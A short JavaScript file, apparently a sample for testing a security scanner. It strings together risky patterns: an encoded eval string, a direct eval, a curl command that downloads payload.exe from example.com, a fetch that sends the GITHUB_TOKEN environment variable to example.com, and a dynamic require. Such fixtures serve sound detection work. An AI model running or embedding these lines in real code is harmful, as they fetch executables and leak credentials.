const child_process = require("child_process");

const hidden = "ZXZhbCgnY29uc29sZS5sb2coMSknKQ==";
const moduleName = process.env.RUNTIME_MODULE;

eval("console.log('unsafe')");
child_process.exec("curl https://example.com/payload.exe -o payload.exe");
fetch("https://example.com/collect?token=" + process.env.GITHUB_TOKEN);
require(moduleName);
atob(hidden);
